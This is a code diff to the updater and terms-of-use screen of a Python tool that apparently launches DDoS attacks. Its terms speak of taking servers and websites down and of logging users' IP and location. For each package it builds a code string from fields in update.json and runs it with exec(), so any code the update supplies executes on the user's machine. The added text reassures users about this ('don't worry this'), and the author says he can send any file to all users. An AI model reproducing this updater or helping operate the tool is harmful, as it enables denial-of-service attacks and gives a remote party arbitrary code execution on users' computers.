@@ -10,11 +10,12 @@ def is_update(file='update.json'):
         json_down = json.loads(c)
         r3 = json_down['PIP']
         c2 = 0
+        load = ['','.','. .','. . .','. . . .']
         for b in r3.keys():
            c2 += 1; sys.stdout.write(f"\r\x1b[38;5;255m[\x1b[38;5;75mINFO\x1b[38;5;255m] \x1b[38;5;198m{b} \x1b[38;5;255mof \x1b[38;5;197m{c2}\x1b[38;5;255m/\x1b[38;5;196m{len(r3.keys())}\x1b[0m\x1b[K"); sys.stdout.flush()
            time.sleep(0.5)
-           craft_payload = f"""import os, sys, time
-load = ['','.','. .','. . .','. . . .']
+           craft_payload = f"""import os
+load = {load}
 try:
     {r3[b]['import']}
     print("\\r\\x1b[K\\x1b[38;5;196mDONE \\x1b[38;5;197mINSTALL \\x1b[38;5;198m{b} \\x1b[38;5;199mPIP!\\x1b[0m")
@@ -27,7 +28,6 @@ except:
     print(f'\\r\\x1b[K\\x1b[38;5;255m[\\x1b[38;5;196mDONE\\x1b[38;5;255m] \\x1b[38;5;226m{b} \\x1b[38;5;227m. . . . \\x1b[38;5;228mdone\\x1b[0m')"""
            exec(craft_payload)
            time.sleep(0.5)
-        load = ['','.','. .','. . .','. . . .']
         c2 = 0
         print(f'\r\x1b[38;5;255m[\x1b[38;5;76mD\x1b[38;5;77mO\x1b[38;5;78mWN\x1b[38;5;79mL\x1b[38;5;80mO\x1b[38;5;81mA\x1b[38;5;117mD\x1b[38;5;255m] \x1b[38;5;196m{file}\x1b[0m\x1b[K')
         for a in json_down['FILE'].keys():
@@ -47,7 +47,7 @@ except:
 with open('setting.json','r') as f:
    a = json.loads(f.read())
    if int(a['MENU']['TOU']) == 0:
-     content = ['''\x1b[1m\x1b[38;5;196mTerms of use\x1b[0m\n\n\x1b[38;5;197mNo support anything for down server game.\nThere is nobody say "\x1b[4mhow to use that methods\x1b[0m\x1b[38;5;197m" bc i write it.\nCan hitting dstat if you own or you trust.\nHitting layer7 target on layer4 it allow if can down.\nAnd if cant down some website it mean you wifi it weak or etc.\x1b[0m''','''\x1b[1m\x1b[38;5;196mPersonal information and security.\x1b[0m\n\n\x1b[38;5;197mThere it not have logs but if have it only for check country and etc.\nIf i leak you information like "\x1b[4mIP\x1b[0m\x1b[38;5;197m", "\x1b[4mCOUNTRY\x1b[0m\x1b[38;5;197m", "\x1b[4mCITY\x1b[0m\x1b[38;5;197m" it for what? i not want to doxing my client.\nThis log will be coming soon it only for check languages and most country use will be make dev for develop anything good,\nfor sure nobody like logs but it not like keylogger.\nSince if you trust dev and if you still not trust i will encrypt with AES-256 and i not keep key in my server it mean that key will be got remove forever.\nLast message i can sent anything file to all ppl use my tool.\nBut i not did bc it my client not you client.\x1b[0m''','''\x1b[1m\x1b[38;5;196mSupport tool.\x1b[0m\n\n\x1b[38;5;197mMy tool it support all like SXP, BOTc2, URANIUM since i was want to support. and check more proof at \x1b[3m\x1b[4mhttps://t.me/+gcA7xQYlsK83ZmRl.\x1b[0m\x1b[38;5;197m\nit proof group but i was boradcast any news to you like "\x1b[4mupdate or more\x1b[0m\x1b[38;5;197m".\nSince you can report any bug in group but github i was resp like 2 week or month bc i was know now but lazy.\x1b[0m''','''\x1b[5;3;1m\x1b[38;5;226mNow you can enter for running tool.\x1b[0m''']
+     content = ['''\x1b[1m\x1b[38;5;196mTerms of use\x1b[0m\n\n\x1b[38;5;197mWe need execute code for install don't worry this\nNo support anything for down server game.\nThere is nobody say "\x1b[4mhow to use that methods\x1b[0m\x1b[38;5;197m" bc i write it.\nCan hitting dstat if you own or you trust.\nHitting layer7 target on layer4 it allow if can down.\nAnd if cant down some website it mean you wifi it weak or etc.\x1b[0m''','''\x1b[1m\x1b[38;5;196mPersonal information and security.\x1b[0m\n\n\x1b[38;5;197mThere it not have logs but if have it only for check country and etc.\nIf i leak you information like "\x1b[4mIP\x1b[0m\x1b[38;5;197m", "\x1b[4mCOUNTRY\x1b[0m\x1b[38;5;197m", "\x1b[4mCITY\x1b[0m\x1b[38;5;197m" it for what? i not want to doxing my client.\nThis log will be coming soon it only for check languages and most country use will be make dev for develop anything good,\nfor sure nobody like logs but it not like keylogger.\nSince if you trust dev and if you still not trust i will encrypt with AES-256 and i not keep key in my server it mean that key will be got remove forever.\nLast message i can sent anything file to all ppl use my tool.\nBut i not did bc it my client not you client.\x1b[0m''','''\x1b[1m\x1b[38;5;196mSupport tool.\x1b[0m\n\n\x1b[38;5;197mMy tool it support all like SXP, BOTc2, URANIUM since i was want to support. and check more proof at \x1b[3m\x1b[4mhttps://t.me/+gcA7xQYlsK83ZmRl.\x1b[0m\x1b[38;5;197m\nit proof group but i was boradcast any news to you like "\x1b[4mupdate or more\x1b[0m\x1b[38;5;197m".\nSince you can report any bug in group but github i was resp like 2 week or month bc i was know now but lazy.\x1b[0m''','''\x1b[5;3;1m\x1b[38;5;226mNow you can enter for running tool.\x1b[0m''']
      CONTENT = 0
      import platform
      if platform.system().upper() == 'WINDOWS':
